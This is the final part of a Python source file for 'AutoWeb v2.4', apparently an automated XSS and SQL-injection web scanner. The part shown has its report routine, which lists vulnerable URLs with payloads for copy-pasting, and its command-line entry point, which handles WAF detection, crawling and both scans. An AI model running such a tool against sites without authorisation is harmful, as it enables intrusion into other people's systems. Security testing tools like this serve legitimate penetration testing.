        ColorPrint.bold("                     FINAL REPORT")
        print("=" * 70)

        elapsed_time = datetime.now() - self.start_time
        
        print(f"\nTarget:      {self.target_url}")
        print(f"Domain:      {self.domain}")
        print(f"Pages crawled: {len(self.visited)}")
        print(f"Pages discovered: {len(self.discovered_urls)}")
        print(f"Forms discovered: {len(self.forms)}")
        print(f"WAF Detected: {self.waf_detected} ({self.waf_name})")
        print(f"Technologies: {', '.join(self.technologies) if self.technologies else 'Unknown'}")
        print(f"Parameters found: {len(self.all_parameters)}")
        print(f"Total requests made: {self.request_count}")
        print(f"Scan duration: {str(elapsed_time).split('.')[0]}")

        print("\n" + "-" * 70)
        ColorPrint.bold("VULNERABILITIES FOUND")
        print("-" * 70)
        
        if self.xss_vulns:
            ColorPrint.bold(f"\nXSS ({len(self.xss_vulns)}):")
            for vuln in self.xss_vulns:
                url = vuln.get('full_url', vuln.get('url', ''))
                payload = vuln['payload']
                print(f"  {url}<{payload}>")
                self.log_to_file(f"{url}<{payload}>")
        
        if self.sqli_vulns:
            ColorPrint.bold(f"\nSQL Injection ({len(self.sqli_vulns)}):")
            for vuln in self.sqli_vulns:
                url = vuln.get('full_url', vuln.get('url', ''))
                payload = vuln['payload']
                print(f"  {url}<{payload}>")
                self.log_to_file(f"{url}<{payload}>")
        
        if not self.xss_vulns and not self.sqli_vulns:
            ColorPrint.info("\n  No vulnerabilities found.")

        # Quick reference for copy-paste
        if self.xss_vulns or self.sqli_vulns:
            print("\n" + "-" * 70)
            ColorPrint.bold("QUICK REFERENCE (Copy-paste these URLs)")
            print("-" * 70 + "\n")
            
            for vuln in self.xss_vulns + self.sqli_vulns:
                url = vuln.get('full_url', vuln.get('url', ''))
                payload = vuln['payload']
                print(f"{url}<{payload}>")
                self.log_to_file(f"{url}<{payload}>")

        print("\n" + "=" * 70)
        ColorPrint.bold("                END OF REPORT")
        print("=" * 70)

        if self.output_file:
            self.output_handle.close()
            ColorPrint.success(f"[+] Results saved to: {self.output_file}")

# ────────────────────────────────────────
# Main
# ────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="AutoWeb v2.4 - High Performance XSS & SQLi Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python autoweb.py -u target.com                    # Fast scan
  python autoweb.py -u target.com -v                 # Verbose mode
  python autoweb.py -u target.com -o results.txt     # Save results
  python autoweb.py -u target.com --threads 20       # More threads
  python autoweb.py -u target.com --no-advanced      # Basic payloads only
        """
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-o', '--output', help='Save results to file')
    parser.add_argument('--crawl-depth', type=int, default=1, help='Crawl depth (default: 1)')
    parser.add_argument('--threads', type=int, default=15, help='Number of threads (default: 15)')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout (default: 5s)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests')
    parser.add_argument('--xss-only', action='store_true', help='XSS only')
    parser.add_argument('--sqli-only', action='store_true', help='SQLi only')
    parser.add_argument('--no-advanced', action='store_true', help='Disable advanced payloads')
    parser.add_argument('--no-auto-detect', action='store_true', help='Disable auto-detection')
    parser.add_argument('--cookie', type=str, help='Cookies (format: name1=value1; name2=value2)')
    parser.add_argument('--header', type=str, action='append', help='Custom headers')
    parser.add_argument('--no-waf', action='store_true', help='Skip WAF detection')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--fast', action='store_true', default=True, help='Fast mode (default)')
    parser.add_argument('--max-workers', type=int, default=20, help='Max workers (default: 20)')

    args = parser.parse_args()

    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(';'):
            pair = pair.strip()
            if '=' in pair:
                k, v = pair.split('=', 1)
                cookies[k.strip()] = v.strip()

    headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()

    print(r"""
     ___       _        ____ _    _______        __
    / _ \__ _ | |_  ___/ ___| |  |_   _\ \      / /
   | | |/ _` || __|/ _ \ |   | |    | |  \ \ /\ / / 
   | |_| (_| || |_|  __/ |___| |___ | |   \ V  V /  
    \___/\__,_| \__|\___|\____|_____|_|    \_/\_/   
                                                     
   AutoWeb v2.4 - High Performance Scanner
   Authorized Security Testing Only
    """)

    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url

    scanner = AutoWebScanner(
        target_url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        cookies=cookies,
        headers=headers,
        crawl_depth=args.crawl_depth,
        delay=args.delay,
        xss_advanced=not args.no_advanced,
        sqli_advanced=not args.no_advanced,
        auto_detect=not args.no_auto_detect,
        output_file=args.output,
        verbose=args.verbose,
        fast_mode=args.fast,
        max_workers=args.max_workers,
    )

    if not args.no_waf:
        scanner.detect_waf()
        print()

    # Auto-detection
    if scanner.auto_detect:
        ColorPrint.info("[*] Auto-detection...")
        scanner.discover_common_paths()
        scanner.discover_dynamic_parameters()

    # Crawl
    scanner.crawl(args.url)

    # Scan
    if not args.sqli_only:
        scanner.scan_xss()
    if not args.xss_only:
        scanner.scan_sqli()

    # Report
    scanner.generate_report()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
